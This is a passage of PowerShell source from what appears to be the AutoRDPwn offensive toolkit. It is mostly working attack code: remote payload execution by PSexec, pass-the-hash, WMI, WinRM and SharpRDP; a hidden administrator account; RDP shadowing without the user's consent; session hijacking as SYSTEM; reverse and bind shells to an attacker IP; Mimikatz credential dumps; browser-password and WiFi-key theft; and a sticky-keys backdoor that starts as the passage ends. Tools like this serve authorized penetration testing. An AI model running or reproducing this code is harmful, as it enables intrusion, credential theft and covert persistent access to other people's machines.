            catch { Write-ARWarn ('RDPWrap could not be installed: ' + $_.Exception.Message) }
        }

        $arguments = @("/v:$target", '/admin')
        if ($sessionId) {
            $arguments += "/shadow:$sessionId"
            $arguments += '/noconsentprompt'
            if ($control) { $arguments += '/control' }
        }
        $arguments += '/f'
        if ($script:ARNoGui) {
            Write-Host ('mstsc ' + ($arguments -join ' ')) -ForegroundColor DarkGray
        }
        else {
            Write-ARInfo (Get-ARText 'txt38' 'Starting remote connection!')
            Start-Process -FilePath 'mstsc.exe' -ArgumentList $arguments | Out-Null
        }
        return [pscustomobject]@{ Control = $control; SessionId = $sessionId; FullDesktop = (-not $sessionId) }
}


function Invoke-ARAction {
    param([Parameter(Mandatory = $true)][string]$Id)
    $action = Get-ARActionById $Id
    if (-not $action) {
        Write-ARError 'Unknown action.'
        return
    }
    Clear-ARScreen
    Set-ARStatus ($action.Title) 'Info'
    try {
        & $action.Handler
        if ($script:ARStatus['Kind'] -eq 'Info') { Set-ARStatus ($action.Title + ' finished') 'Ok' }
    }
    catch {
        Set-ARStatus $_.Exception.Message 'Error'
        Write-ARError $_.Exception.Message
    }
    if (-not $script:ARInvokedFromOption) {
        Write-ARBlank
        Write-Host ' Press any key to return to the menu' -ForegroundColor DarkGray
        try { $null = [Console]::ReadKey($true) } catch { try { Read-Host | Out-Null } catch { } }
    }
}

function Invoke-ARCleanup {
    if ($script:ARCleanupDone) { return }
    $script:ARCleanupDone = $true
    if ($script:ARNoClean) {
        Close-ARTargetSession
        Restore-ARDefender
        $script:AROverrideCredential = $null
        return
    }
    if ($script:ARSession) {
        try {
            Invoke-Command -Session $script:ARSession -ScriptBlock {
                Get-Job -ErrorAction SilentlyContinue | Where-Object { $_.Name -like 'AutoRDPwn_*' } | Stop-Job -ErrorAction SilentlyContinue
                Get-Job -ErrorAction SilentlyContinue | Where-Object { $_.Name -like 'AutoRDPwn_*' } | Remove-Job -Force -ErrorAction SilentlyContinue
            } -ErrorAction SilentlyContinue | Out-Null
        } catch { }
        foreach ($directory in $script:ARRemoteTempDirs.ToArray()) {
            try {
                Invoke-Command -Session $script:ARSession -ArgumentList $directory -ScriptBlock {
                    param($path)
                    Remove-Item -LiteralPath $path -Recurse -Force -ErrorAction SilentlyContinue
                } -ErrorAction SilentlyContinue | Out-Null
            } catch { }
        }
    }
    if ($script:ARHashUserName -ne '' -and $script:ARSession) {
        try {
            Invoke-Command -Session $script:ARSession -ArgumentList $script:ARHashUserName -ScriptBlock {
                param($name)
                net user $name /delete 2>&1> $null
                Remove-Item -LiteralPath (Join-Path 'C:\Users' $name) -Recurse -Force -ErrorAction SilentlyContinue
                Unregister-ScheduledTask -TaskName 'AutoRDPwn' -Confirm:$false -ErrorAction SilentlyContinue
            } -ErrorAction SilentlyContinue | Out-Null
        } catch { }
    }
    $script:ARHashUserName = ''
    foreach ($target in $script:ARCmdKeyTargets.ToArray()) {
        cmdkey.exe "/delete:$target" 2>&1> $null
    }
    $script:ARCmdKeyTargets.Clear()
    Close-ARTargetSession
    Restore-ARDefender
    foreach ($directory in $script:ARWorkDirs.ToArray()) {
        if (Test-Path -LiteralPath $directory) {
            Remove-Item -LiteralPath $directory -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
    foreach ($file in $script:ARTemporaryFiles.ToArray()) {
        if (Test-Path -LiteralPath $file) {
            Remove-Item -LiteralPath $file -Force -ErrorAction SilentlyContinue
        }
    }
    $script:ARWorkDirs.Clear()
    $script:ARTemporaryFiles.Clear()
    $script:ARRemoteTempDirs.Clear()
    $script:AROverrideCredential = $null
    try { Set-Location -LiteralPath $script:AROriginalLocation } catch { }
    Write-ARInfo (Get-ARText 'txt76' 'Cleaning done!')
}

function Get-ARAttackPayloadCommand {
    param([Parameter(Mandatory = $true)][string]$Payload)
    $escaped = $Payload -replace '"', '\"'
    return 'powershell.exe -windowstyle hidden -Command "' + $escaped + '"'
}

function Invoke-ARAttackPSexec {
    $target = Get-ARTargetComputer
    Import-ARToolScript 'Resources\Scripts\Invoke-PSexec.ps1'
    $executable = Join-Path $script:ARTools 'psexec.exe'
    if (-not (Test-Path -LiteralPath $executable)) { throw 'PSexec could not be extracted.' }
    $user = Get-ARTargetUserName
    $password = ''
    if ($user -ne '') { $password = Get-ARPlainPassword }
    foreach ($payload in @(Get-ARPayloads)) {
        $arguments = @("\\$target")
        if ($user -ne '') { $arguments += @('-u', $user, '-p', $password) }
        $arguments += @('-h', '-d', 'powershell.exe', '-windowstyle', 'hidden', $payload, '-nobanner', '-accepteula')
        & $executable @arguments 2>&1 | ForEach-Object { Write-Host $_ }
    }
    Set-ARStatus 'Payloads started with PSexec' 'Ok'
    Connect-ARTargetSession | Out-Null
    Invoke-ARShadowEngine | Out-Null
}

function Invoke-ARAttackPassTheHash {
    $target = Get-ARTargetComputer
    if ([string]::IsNullOrWhiteSpace($script:ARTarget['User'])) {
        $script:ARTarget['User'] = Read-ARValue 'User'
    }
    if ([string]::IsNullOrWhiteSpace($script:ARTarget['Hash'])) {
        $script:ARTarget['Hash'] = Read-ARValue 'NTLM hash'
    }
    $user = [string]$script:ARTarget['User']
    $hash = [string]$script:ARTarget['Hash']
    $domain = [string]$script:ARTarget['Domain']
    . (Get-ARResourcePath 'Resources\Scripts\Invoke-SMBExec.ps1')
    foreach ($payload in @(Get-ARPayloads)) {
        $command = Get-ARAttackPayloadCommand $payload
        Invoke-SMBExec -Target $target -Domain $domain -Username $user -Hash $hash -Command $command 2>&1 | ForEach-Object { Write-Host $_ }
    }
    $createUser = Get-ARText 'Pwn5' ''
    if ($createUser -ne '') {
        Invoke-SMBExec -Target $target -Domain $domain -Username $user -Hash $hash -Command $createUser 2>&1 | ForEach-Object { Write-Host $_ }
    }
    $hashUser = 'ARDP_' + [guid]::NewGuid().ToString('N').Substring(0, 8)
    $createHashUser = 'net user ' + $hashUser + ' AutoRDPwn /add & net localgroup Administrators ' + $hashUser + ' /add'
    Invoke-SMBExec -Target $target -Domain $domain -Username $user -Hash $hash -Command $createHashUser 2>&1 | ForEach-Object { Write-Host $_ }
    $script:ARHashUserName = $hashUser
    $secure = ConvertTo-SecureString -String 'AutoRDPwn' -AsPlainText -Force
    $script:AROverrideCredential = New-Object System.Management.Automation.PSCredential($hashUser, $secure)
    Start-Sleep -Seconds 2
    try {
        Connect-ARTargetSession -Force | Out-Null
        Invoke-ARShadowEngine | Out-Null
    }
    finally {
        $script:AROverrideCredential = $null
    }
}

function Invoke-ARAttackWmi {
    $target = Get-ARTargetComputer
    $credential = Get-ARTargetCredential
    $parameters = @{ ComputerName = $target; ErrorAction = 'Stop' }
    if ($credential) { $parameters['Credential'] = $credential }
    $cimSession = New-CimSession @parameters
    try {
        foreach ($payload in @(Get-ARPayloads)) {
            $command = Get-ARAttackPayloadCommand $payload
            $result = Invoke-CimMethod -CimSession $cimSession -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = $command } -ErrorAction Stop
            if ($result.ReturnValue -ne 0) {
                Write-ARWarn ('WMI process creation returned ' + $result.ReturnValue)
            }
        }
    }
    finally { Remove-CimSession -CimSession $cimSession -ErrorAction SilentlyContinue }
    Set-ARStatus 'Payloads started with WMI' 'Ok'
    Connect-ARTargetSession | Out-Null
    Invoke-ARShadowEngine | Out-Null
}

function Invoke-ARAttackWinRm {
    $target = Get-ARTargetComputer
    $credential = Get-ARTargetCredential
    foreach ($payload in @(Get-ARPayloads)) {
        $parameters = @{
            ComputerName = $target
            ScriptBlock = { param($command) & powershell.exe -WindowStyle Hidden -Command $command }
            ArgumentList = @($payload)
            ErrorAction = 'Stop'
        }
        if ($credential) {
            $parameters['Credential'] = $credential
            $parameters['Authentication'] = 'Negotiate'
        }
        Invoke-Command @parameters | Out-Null
    }
    Set-ARStatus 'Payloads started with WinRM' 'Ok'
    Connect-ARTargetSession -Force | Out-Null
    Invoke-ARShadowEngine | Out-Null
}

function Invoke-ARAttackWinRs {
    $target = Get-ARTargetComputer
    $user = Get-ARTargetUserName
    $password = ''
    if ($user -ne '') { $password = Get-ARPlainPassword }
    foreach ($payload in @(Get-ARPayloads)) {
        $command = Get-ARAttackPayloadCommand $payload
        $arguments = @("/r:$target")
        if ($user -ne '') { $arguments += @("/u:$user", "/p:$password") }
        $arguments += @('/noecho', '/noprofile', '/allowdelegate', $command)
        & winrs.exe @arguments 2>&1 | ForEach-Object { Write-Host $_ }
        Start-Sleep -Milliseconds 600
    }
    Set-ARStatus 'Payloads started with WinRS' 'Ok'
    Connect-ARTargetSession | Out-Null
    Invoke-ARShadowEngine | Out-Null
}

function Invoke-ARAttackTscon {
    if (-not (Test-ARIsAdmin)) { throw 'Administrator privileges are required for TSCon.' }
    $query = & query.exe session 2>&1
    Show-ARText $query
    $sessionId = Get-ARSessionId $query 1
    if (-not $script:ARInvokedFromOption) {
        $answer = Read-ARValue 'Session ID' ([string]$sessionId)
        if ($answer -match '^\d+$') { $sessionId = [int]$answer }
    }
    $taskName = 'AutoRDPwnTscon' + [guid]::NewGuid().ToString('N').Substring(0, 8)
    $action = New-ScheduledTaskAction -Execute (Join-Path $env:SystemRoot 'System32\tscon.exe') -Argument ([string]$sessionId)
    $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
    try {
        Register-ScheduledTask -TaskName $taskName -Action $action -Principal $principal -Force | Out-Null
        Start-ScheduledTask -TaskName $taskName -ErrorAction Stop
        Start-Sleep -Seconds 2
    }
    finally {
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
    }
    Set-ARStatus ('Session ' + $sessionId + ' hijacked') 'Ok'
}

function Invoke-ARAttackRdp {
    $target = Get-ARTargetComputer
    Import-ARToolScript 'Resources\Scripts\Invoke-SharpRDP.ps1'
    $executable = Join-Path $script:ARTools 'SharpRDP.exe'
    if (-not (Test-Path -LiteralPath $executable)) { throw 'SharpRDP could not be extracted.' }
    $user = Get-ARTargetUserName
    $password = ''
    if ($user -ne '') { $password = Get-ARPlainPassword }
    foreach ($payload in @(Get-ARPayloads)) {
        $command = Get-ARAttackPayloadCommand $payload
        $arguments = @("computername=$target")
        if ($user -ne '') { $arguments += @("username=$user", "password=$password") }
        $arguments += "command=$command"
        & $executable @arguments 2>&1 | ForEach-Object { Write-Host $_ }
    }
    Set-ARStatus 'Payloads started with SharpRDP' 'Ok'
    Connect-ARTargetSession | Out-Null
    Invoke-ARShadowEngine | Out-Null
}

function Invoke-ARAttackQuickScreen {
    $target = Get-ARTargetComputer
    if ([string]::IsNullOrWhiteSpace($script:ARTarget['User'])) {
        if ($script:ARInvokedFromOption) { throw 'Quick Screen requires a target user.' }
        $script:ARTarget['User'] = Read-ARValue 'Target user' $env:USERNAME
    }
    $password = Get-ARPlainPassword
    $attacker = [string]$script:ARTarget['AttackerIP']
    if ([string]::IsNullOrWhiteSpace($attacker)) {
        if ($script:ARInvokedFromOption) { throw 'Quick Screen requires the attacker IP.' }
        $attacker = Read-ARValue (Get-ARText 'txt123' 'Your IP for the reverse connection')
    }
    $viewOnly = ([string]$script:ARTarget['Mode'] -eq 'view')
    $null = Get-ARResourcePath 'Resources\Scripts\Invoke-VNCViewer.ps1'
    $null = Get-ARResourcePath 'Resources\Scripts\Invoke-VNCServer.ps1'
    . (Get-ARResourcePath 'Resources\Scripts\Invoke-StealthScreen.ps1')
    Invoke-StealthScreen -Target $target -User ([string]$script:ARTarget['User']) -Pass $password -Mode view -AttackerIP $attacker -Port 5500 -ViewOnly:$viewOnly
    Set-ARStatus 'Quick Screen finished' 'Ok'
}

function Invoke-ARModulePipeShell {
    $target = Get-ARTargetComputer
    $scriptPath = Get-ARResourcePath 'Resources\Scripts\Invoke-PipeShell.ps1'
    if (Test-ARIsLocalTarget) {
        Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
            param($path)
            . $path
            Invoke-PipeShell -mode server -aeskey AutoRDPwn_AESKey -server localhost -Pipe 'NamedPipeStream'
        } -ArgumentList $scriptPath | Out-Null
    }
    else {
        $session = Get-ARTargetSession
        $remoteDirectory = 'C:\Windows\Temp\AutoRDPwnPipe_' + [guid]::NewGuid().ToString('N')
        $remoteScript = Join-Path $remoteDirectory 'Invoke-PipeShell.ps1'
        Copy-ARFileToTarget -LocalPath $scriptPath -RemotePath $remoteScript | Out-Null
        $script:ARRemoteTempDirs.Add($remoteDirectory)
        Invoke-Command -Session $session -ArgumentList $remoteScript -ScriptBlock {
            param($path)
            Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
                param($script)
                . $script
                Invoke-PipeShell -mode server -aeskey AutoRDPwn_AESKey -server localhost -Pipe 'NamedPipeStream'
            } -ArgumentList $path | Out-Null
        } -ErrorAction Stop | Out-Null
    }
    . (Get-ARResourcePath 'Resources\Scripts\Invoke-PipeShell.ps1')
    Write-ARInfo 'Named pipe server started on the target.'
    Invoke-PipeShell -mode client -server $target -aeskey AutoRDPwn_AESKey -i -pipe 'NamedPipeStream' -timeout 120
    Set-ARStatus 'Named pipe shell closed' 'Ok'
}

function Invoke-ARModuleWinRsConsole {
    $target = Get-ARTargetComputer
    $user = Get-ARTargetUserName
    $arguments = @("/r:$target")
    if ($user -ne '') { $arguments += @("/u:$user", "/p:$(Get-ARPlainPassword)") }
    $arguments += @('/noecho', '/noprofile', '/allowdelegate', 'cmd.exe')
    Write-ARInfo 'Opening a WinRS console. Type exit to close it.'
    & winrs.exe @arguments
    Set-ARStatus 'WinRS console closed' 'Ok'
}

function Invoke-ARModuleHttpRevShell {
    $target = Get-ARTargetComputer
    $ip = [string]$script:ARTarget['AttackerIP']
    if ([string]::IsNullOrWhiteSpace($ip)) {
        if ($script:ARInvokedFromOption) { throw 'The attacker IP is required.' }
        $ip = Read-ARValue (Get-ARText 'txt54' 'Enter the remote IP')
    }
    $port = Read-ARValue (Get-ARText 'txt43' 'Enter the remote port') '8080'
    $scriptPath = Get-ARResourcePath 'Resources\Scripts\Invoke-WebRev.ps1'
    Push-Location $script:ARTools
    try { . $scriptPath; $encoded = $webrev64 } finally { Pop-Location }
    if (-not $encoded) { throw 'The HTTP reverse shell payload is empty.' }
    if (Test-ARIsLocalTarget) {
        Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
            param($data, $address, $listenPort)
            $source = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($data))
            . ([scriptblock]::Create($source))
            Invoke-WebRev -ip $address -port $listenPort
        } -ArgumentList $encoded, $ip, $port | Out-Null
    }
    else {
        $session = Get-ARTargetSession
        Invoke-Command -Session $session -ArgumentList $encoded, $ip, $port -ScriptBlock {
            param($data, $address, $listenPort)
            Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
                param($payload, $remoteAddress, $remotePort)
                $source = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($payload))
                . ([scriptblock]::Create($source))
                Invoke-WebRev -ip $remoteAddress -port $remotePort
            } -ArgumentList $payload, $address, $listenPort | Out-Null
        } -ErrorAction Stop | Out-Null
    }
    Import-ARToolScript 'Resources\Scripts\Invoke-RevShellServer.ps1'
    $server = Join-Path $script:ARTools 'server.exe'
    if (-not (Test-Path -LiteralPath $server)) { throw 'The reverse shell server could not be extracted.' }
    Write-ARInfo ('Starting HTTP reverse shell server on ' + $ip + ':' + $port + ' (Ctrl+C stops it).')
    & $server $ip $port
    Set-ARStatus 'HTTP reverse shell server stopped' 'Ok'
}

function Invoke-ARModuleNetcatDirect {
    $target = Get-ARTargetComputer
    $port = Read-ARValue (Get-ARText 'txt53' 'Enter the port to listen to')
    $scriptPath = Get-ARResourcePath 'Resources\Scripts\Invoke-PowerShellTcp.ps1'
    if (Test-ARIsLocalTarget) {
        Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
            param($path, $listenPort)
            . $path
            Invoke-PowerShellTcp -Bind -Port $listenPort
        } -ArgumentList $scriptPath, ([int]$port) | Out-Null
    }
    else {
        $session = Get-ARTargetSession
        $remoteDirectory = 'C:\Windows\Temp\AutoRDPwnNetcat_' + [guid]::NewGuid().ToString('N')
        $remoteScript = Join-Path $remoteDirectory 'Invoke-PowerShellTcp.ps1'
        Copy-ARFileToTarget -LocalPath $scriptPath -RemotePath $remoteScript | Out-Null
        $script:ARRemoteTempDirs.Add($remoteDirectory)
        Invoke-Command -Session $session -ArgumentList $remoteScript, ([int]$port) -ScriptBlock {
            param($path, $listenPort)
            netsh advfirewall firewall delete rule name="Powershell Remote Control Application" 2>&1> $null
            netsh advfirewall firewall add rule name="Powershell Remote Control Application" dir=in action=allow protocol=TCP localport=$listenPort 2>&1> $null
            Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
                param($script, $localPort)
                . $script
                Invoke-PowerShellTcp -Bind -Port $localPort
            } -ArgumentList $path, $listenPort | Out-Null
        } -ErrorAction Stop | Out-Null
    }
    Write-Host '----------------------------------------------------------------------' -ForegroundColor Gray
    Write-Host ('Netcat direct connection --> ') -NoNewline -ForegroundColor Green
    Write-Host ('nc ' + $target + ' ' + $port) -ForegroundColor Blue
    Write-Host '----------------------------------------------------------------------' -ForegroundColor Gray
    Set-ARStatus ('Listener started on ' + $target + ':' + $port) 'Ok'
}

function Invoke-ARModuleNetcatReverse {
    $target = Get-ARTargetComputer
    $ip = [string]$script:ARTarget['AttackerIP']
    if ([string]::IsNullOrWhiteSpace($ip)) {
        if ($script:ARInvokedFromOption) { throw 'The attacker IP is required.' }
        $ip = Read-ARValue (Get-ARText 'txt54' 'Enter the remote IP')
    }
    $port = Read-ARValue (Get-ARText 'txt53' 'Enter the port to listen to')
    $scriptPath = Get-ARResourcePath 'Resources\Scripts\Invoke-PowerShellTcp.ps1'
    Write-Host '----------------------------------------------------------------------' -ForegroundColor Gray
    Write-Host ('Netcat reverse connection --> ') -NoNewline -ForegroundColor Green
    Write-Host ('nc -l ' + $port) -ForegroundColor Blue
    Write-Host '----------------------------------------------------------------------' -ForegroundColor Gray
    if (Test-ARIsLocalTarget) {
        Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
            param($path, $address, $remotePort)
            . $path
            Start-Sleep -Seconds 5
            Invoke-PowerShellTcp -Reverse -IPAddress $address -Port $remotePort
        } -ArgumentList $scriptPath, $ip, ([int]$port) | Out-Null
    }
    else {
        $session = Get-ARTargetSession
        $remoteDirectory = 'C:\Windows\Temp\AutoRDPwnNetcat_' + [guid]::NewGuid().ToString('N')
        $remoteScript = Join-Path $remoteDirectory 'Invoke-PowerShellTcp.ps1'
        Copy-ARFileToTarget -LocalPath $scriptPath -RemotePath $remoteScript | Out-Null
        $script:ARRemoteTempDirs.Add($remoteDirectory)
        Invoke-Command -Session $session -ArgumentList $remoteScript, $ip, ([int]$port) -ScriptBlock {
            param($path, $address, $remotePort)
            Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
                param($script, $remoteAddress, $targetPort)
                . $script
                Start-Sleep -Seconds 5
                Invoke-PowerShellTcp -Reverse -IPAddress $remoteAddress -Port $targetPort
            } -ArgumentList $path, $address, $remotePort | Out-Null
        } -ErrorAction Stop | Out-Null
    }
    Write-ARInfo 'The target will connect back in about 5 seconds. Keep the listener ready.'
    Set-ARStatus 'Reverse connection scheduled' 'Ok'
}

function Invoke-ARModuleMimikatzSam {
    Write-ARInfo 'Extracting credentials with Mimikatz (SAM)...'
    $result = Invoke-ARTargetPowerShell -RelativePath 'Resources\Scripts\Invoke-Mimikatz.ps1' -Function 'Invoke-Mimikatz' -Arguments @{ Command = 'privilege::debug token::elevate lsadump::sam exit' }
    Show-ARText $result
    Set-ARStatus 'SAM dump finished' 'Ok'
}

function Invoke-ARModuleMimikatzLogon {
    Write-ARInfo 'Extracting credentials with Mimikatz (logon passwords)...'
    $result = Invoke-ARTargetPowerShell -RelativePath 'Resources\Scripts\Invoke-Mimikatz.ps1' -Function 'Invoke-Mimikatz' -Arguments @{ Command = 'privilege::debug token::elevate sekurlsa::logonPasswords exit' }
    Show-ARText $result
    Set-ARStatus 'Logon password dump finished' 'Ok'
}

function Invoke-ARModuleSharpWeb {
    Import-ARToolScript 'Resources\Scripts\Invoke-SharpWeb.ps1'
    $executable = Join-Path $script:ARTools 'SharpWeb.exe'
    if (-not (Test-Path -LiteralPath $executable)) { throw 'SharpWeb could not be extracted.' }
    $result = Invoke-ARTargetBinary -LocalPath $executable -Arguments @('all')
    Show-ARText $result
    Set-ARStatus 'Browser password recovery finished' 'Ok'
}

function Invoke-ARModuleWifiKeys {
    $result = Invoke-ARTargetCommand -ScriptBlock {
        $directory = Join-Path $env:TEMP ('wifi_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $directory -Force | Out-Null
        try {
            & netsh.exe wlan export profile folder="$directory" key=clear 2>&1> $null
            $lines = New-Object System.Collections.Generic.List[string]
            $profiles = Get-ChildItem -LiteralPath $directory -Filter '*.xml' -ErrorAction SilentlyContinue
            foreach ($profile in $profiles) {
                try {
                    [xml]$xml = Get-Content -LiteralPath $profile.FullName -Raw
                    $name = [string]$xml.WLANProfile.name
                    $key = [string]$xml.WLANProfile.MSM.security.sharedKey.keyMaterial
                    if ($name -ne '') { $lines.Add(('SSID: ' + $name + '  Key: ' + $key)) }
                } catch { }
            }
            if ($lines.Count -eq 0) { return 'There is no wireless network on this computer' }
            return ($lines -join "`n")
        }
        finally { Remove-Item -LiteralPath $directory -Recurse -Force -ErrorAction SilentlyContinue }
    }
    Show-ARText $result
    Set-ARStatus 'WiFi keys recovered' 'Ok'
}

function Invoke-ARModulePortScan {
    $target = Get-ARTargetComputer
    $range = Read-ARValue (Get-ARText 'txt55' 'Enter the IP or network range') $target
    $speed = Read-ARValue (Get-ARText 'txt56' 'Enter the scanning speed (1-5)') '3'
    $ports = Read-ARValue (Get-ARText 'txt57' 'Enter the number of ports to scan (25-1000)') '100'
    if ($speed -notmatch '^[1-5]$') { $speed = '3' }
    if ($ports -notmatch '^\d+$') { $ports = '100' }
    $threads = @{ '1' = 10; '2' = 25; '3' = 50; '4' = 100; '5' = 200 }[$speed]
    $oldProgress = $ProgressPreference
    $ProgressPreference = 'Continue'
    try {
        . (Get-ARResourcePath 'Resources\Scripts\Invoke-Portscan.ps1')
        Invoke-Portscan -Hosts $range -Threads $threads -TopPorts $ports
    }
    finally { $ProgressPreference = $oldProgress }
    Set-ARStatus 'Port scan finished' 'Ok'
}

function Invoke-ARModulePortForward {
    $operation = Read-ARValue 'Operation (1 local add, 2 remote add, 3 show, 4 reset)' '3'
    if (Test-ARIsLocalTarget) {
        $scriptBlock = {
            param($action, $lport, $lhost, $rport, $rhost)
            switch ($action) {
                'add' { & netsh.exe interface portproxy add v4tov4 "listenport=$lport" "listenaddress=$lhost" "connectport=$rport" "connectaddress=$rhost" }
                'show' { & netsh.exe interface portproxy show all }
                'reset' { & netsh.exe interface portproxy reset }
            }
        }
        if ($operation -eq '1' -or $operation -eq '2') {
            $lport = Read-ARValue (Get-ARText 'txt41' 'Enter the local port')
            $lhost = Read-ARValue (Get-ARText 'txt42' 'Which interface do you want to use?') '0.0.0.0'
            $rport = Read-ARValue (Get-ARText 'txt43' 'Enter the remote port')
            $rhost = Read-ARValue (Get-ARText 'txt44' 'Finally, the destination IP')
            & $scriptBlock 'add' $lport $lhost $rport $rhost
        }
        elseif ($operation -eq '4') { & $scriptBlock 'reset' }
        else { & $scriptBlock 'show' }
        Set-ARStatus 'Port forwarding updated' 'Ok'
        return
    }
    if ($operation -eq '1') {
        $lport = Read-ARValue (Get-ARText 'txt41' 'Enter the local port')
        $lhost = Read-ARValue (Get-ARText 'txt42' 'Which interface do you want to use?') '0.0.0.0'
        $rport = Read-ARValue (Get-ARText 'txt43' 'Enter the remote port')
        $rhost = Read-ARValue (Get-ARText 'txt44' 'Finally, the destination IP')
        & netsh.exe interface portproxy add v4tov4 "listenport=$lport" "listenaddress=$lhost" "connectport=$rport" "connectaddress=$rhost"
        Set-ARStatus 'Local port forwarding created' 'Ok'
        return
    }
    $parameters = @{}
    if ($operation -eq '2') {
        $parameters['lport'] = Read-ARValue (Get-ARText 'txt41' 'Enter the local port')
        $parameters['lhost'] = Read-ARValue (Get-ARText 'txt42' 'Which interface do you want to use?') '0.0.0.0'
        $parameters['rport'] = Read-ARValue (Get-ARText 'txt43' 'Enter the remote port')
        $parameters['rhost'] = Read-ARValue (Get-ARText 'txt44' 'Finally, the destination IP')
        Invoke-ARTargetCommand -ScriptBlock {
            param($lport, $lhost, $rport, $rhost)
            & netsh.exe interface portproxy add v4tov4 "listenport=$lport" "listenaddress=$lhost" "connectport=$rport" "connectaddress=$rhost"
        } -ArgumentList @($parameters['lport'], $parameters['lhost'], $parameters['rport'], $parameters['rhost']) | ForEach-Object { Write-Host $_ }
        Set-ARStatus 'Remote port forwarding created' 'Ok'
    }
    elseif ($operation -eq '4') {
        Invoke-ARTargetCommand -ScriptBlock { & netsh.exe interface portproxy reset } | ForEach-Object { Write-Host $_ }
        Set-ARStatus 'Remote port forwarding reset' 'Ok'
    }
    else {
        Invoke-ARTargetCommand -ScriptBlock { & netsh.exe interface portproxy show all } | ForEach-Object { Write-Host $_ }
        Set-ARStatus 'Remote port forwarding listed' 'Ok'
    }
}

function Invoke-ARModuleWebServer {
    $target = Get-ARTargetComputer
    $scriptPath = Get-ARResourcePath 'Resources\Scripts\Start-WebServer.ps1'
    if (Test-ARIsLocalTarget) {
        Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
            param($path)
            . $path
            Start-WebServer -BINDING 'http://+:8080/'
        } -ArgumentList $scriptPath | Out-Null
    }
    else {
        $session = Get-ARTargetSession
        $remoteDirectory = 'C:\Windows\Temp\AutoRDPwnWeb_' + [guid]::NewGuid().ToString('N')
        $remoteScript = Join-Path $remoteDirectory 'Start-WebServer.ps1'
        Copy-ARFileToTarget -LocalPath $scriptPath -RemotePath $remoteScript | Out-Null
        $script:ARRemoteTempDirs.Add($remoteDirectory)
        Invoke-Command -Session $session -ArgumentList $remoteScript -ScriptBlock {
            param($path)
            netsh advfirewall firewall delete rule name="Powershell Web Server" 2>&1> $null
            netsh advfirewall firewall add rule name="Powershell Web Server" dir=in action=allow protocol=TCP localport=8080 2>&1> $null
            Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
                param($script)
                . $script
                Start-WebServer -BINDING 'http://+:8080/'
            } -ArgumentList $path | Out-Null
        } -ErrorAction Stop | Out-Null
    }
    $url = 'http://' + $target + ':8080/'
    Write-Host '----------------------------------------------------------------------' -ForegroundColor Gray
    Write-Host 'Powershell Web Server --> ' -NoNewline -ForegroundColor Green
    Write-Host $url -ForegroundColor Blue
    Write-Host '----------------------------------------------------------------------' -ForegroundColor Gray
    try { Start-Process $url | Out-Null } catch { }
    Set-ARStatus 'Web server started' 'Ok'
}

function Invoke-ARModuleCredScan {
    $range = Read-ARValue (Get-ARText 'txt55' 'Enter the IP or network range')
    $user = Read-ARValue (Get-ARText 'txt78' 'Enter the username')
    $method = Read-ARValue (Get-ARText 'txt83' 'Select the verification method (Hash / Password)') 'hash'
    $method = $method.ToLowerInvariant()
    if ($method -like 'pass*' -or $method -like 'contra*') {
        $plain = Read-ARSecret 'Password'
        . (Get-ARResourcePath 'Resources\Scripts\Get-NTLM.ps1')
        $hash = Get-NTLM $plain
    }
    else {
        $hash = Read-ARValue (Get-ARText 'txt84' 'Enter the NTLM Hash')
    }
    $protocol = Read-ARValue (Get-ARText 'txt85' 'Enter the protocol you want to use (SMB / WMI)') 'SMB'
    . (Get-ARResourcePath 'Resources\Scripts\Check-LocalAdminHash.ps1')
    Check-LocalAdminHash -Username $user -PasswordHash $hash -CIDR $range -Protocol $protocol -Threads 20
    Set-ARStatus 'Credential scan finished' 'Ok'
}

function Invoke-ARModuleRdpCaching {
    if (-not (Test-ARIsLocalTarget)) { throw 'RDP-Caching only reads the local image cache.' }
    Write-ARWarn (Get-ARText 'txt19' 'This process can take several minutes..')
    $null = Invoke-ARTargetPowerShell -RelativePath 'Resources\Scripts\RDP-Caching.ps1'
    $recovered = Join-Path $env:TEMP 'Recovered_RDP_Session'
    if (-not (Test-Path -LiteralPath $recovered)) { throw 'No cached RDP images were recovered.' }
    Write-ARSuccess ('Recovered images: ' + $recovered)
    try { Start-Process explorer.exe -ArgumentList $recovered | Out-Null } catch { }
    if (-not $script:ARInvokedFromOption) {
        $null = Read-ARLineValue ' Press Enter to delete the recovered folder: '
        Remove-Item -LiteralPath $recovered -Recurse -Force -ErrorAction SilentlyContinue
    }
    Set-ARStatus 'RDP cache rebuilt' 'Ok'
}

function Invoke-ARModuleListUsers {
    $result = Invoke-ARTargetPowerShell -RelativePath 'Resources\Scripts\ListAllUsers.ps1' -Function 'ListAllUsers'
    Show-ARText $result
    Set-ARStatus 'User enumeration finished' 'Ok'
}

function Invoke-ARModuleSessionGopher {
    $result = Invoke-ARTargetPowerShell -RelativePath 'Resources\Scripts\SessionGopher.ps1' -Function 'Invoke-SessionGopher' -Arguments @{ Thorough = $true }
    Show-ARText $result
    Set-ARStatus 'SessionGopher finished' 'Ok'
}

function Invoke-ARModuleStickyKeys {
    Write-ARInfo (Get-ARText 'txt34' 'Modifying permissions to enter without credentials..')
    Invoke-ARTargetCommand -ScriptBlock {
        $keys = @('sethc.exe', 'Utilman.exe')
        foreach ($key in $keys) {
            $path = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\' + $key
